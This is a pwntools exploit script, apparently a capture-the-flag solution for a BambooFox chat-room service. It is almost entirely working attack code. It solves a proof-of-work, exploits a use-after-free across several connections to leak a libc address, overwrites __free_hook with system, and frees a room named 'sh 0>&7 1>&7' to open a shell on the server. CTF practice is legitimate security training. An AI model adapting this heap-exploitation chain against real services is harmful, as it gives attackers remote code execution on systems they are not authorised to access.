from pwn import *
from exppow import solve_pow
from time import sleep
#IP = "127.0.0.1"
IP = "pwn-hoc.ctf.bamboofox.tw"
TOKEN = "lys"
PORT_W = 10101
PORT = 0

powr = remote(IP, PORT_W)
powr.recvline()
powres = powr.recvline()
powr.sendline(str(solve_pow(powres[7:23].decode(),22)))
powr.recvuntil("port ")
PORT = int(powr.recvline()[:-2])
powr.close()
info("POW Solved, get port "+str(PORT))
#for _ in range(5):
#    remote(IP,PORT)
r = []
#r.append(remote(IP,PORT))
#r[0].sendlineafter("token: ",TOKEN)
#r[0].recvuntil("CSY")
for _ in range(5):
    rr = remote(IP,PORT)
    r.append(rr)
    #rr.sendlineafter("token: ",TOKEN)

def create_room(rid, name):
    r[rid].sendlineafter("> ","1")
    #r[rid].interactive()
    r[rid].sendafter("name: ",name)
    r[rid].recvuntil("id: ")
    return int(r[rid].recvline()[:-1])
def show_room(rid, idx):
    r[rid].sendlineafter("> ","2")
    r[rid].sendlineafter("index: ",str(idx))
def enter_room_idx(rid, idx):
    r[rid].sendlineafter("> ","3")
    r[rid].sendlineafter("enter: ",str(idx))
def enter_room_name(rid, name):
    r[rid].sendafter("name: ", name)
def enter_room(rid, idx, name):
    enter_room_idx(rid, idx)
    enter_room_name(rid, name)
def destruct_room(rid, idx):
    r[rid].sendlineafter("> ","4")
    r[rid].sendlineafter("destruct: ",str(idx))

'''
partial overwrite 0x0890
0x7f2cf4000890: 0x00007f2cf8cfbc40      0x0000000000000000
'''
room0 = create_room(0, "a")
enter_room(0, room0, b'u')
enter_room_idx(1, room0)
destruct_room(0, room0)
room2 = create_room(2, "a")
enter_room(2, room2, b'u')
enter_room(2, room2, b'u')
enter_room_name(1, b'\x90\x08')
#input("@")
info("wait...")
sleep(5)
room0 = create_room(0, "b\n")
#r[0].interactive()
enter_room(0, room0, b'u')
enter_room_idx(0, room0)
r[0].close()
show_room(1, room0)
r[1].recvuntil("User u\n")
libc_base = u64(r[1].recvline()[:-1].split()[1].ljust(8,b'\x00'))-0x1e4c40
info("Libc leak: "+hex(libc_base))
free_hook = libc_base+0x1e75a8
system = libc_base+0x52fd0

#for _ in range(3):
#    r[_] = remote(IP, PORT)
#r[0] = remote(IP, PORT)
#r[1].interactive()
room3 = create_room(3, "a")
enter_room(3, room3, b'u')
enter_room_idx(4, room3)
destruct_room(3, room3)
room2 = create_room(2, "a")
enter_room(2, room2, b'u')
enter_room(2, room2, b'u')
enter_room_name(4, p64(free_hook))
#input("@")
info("wait...")
sleep(5)
room3 = create_room(3, "b")
enter_room(3, room3, b'u')
enter_room(3, room3, p64(system))

shellroom = create_room(3, "sh 0>&7 1>&7")
destruct_room(3, shellroom)
r[3].interactive()
#r[1].interactive()
#show_room(0, room0)
#input()
#r[0].interactive()
for re in r:
    re.close()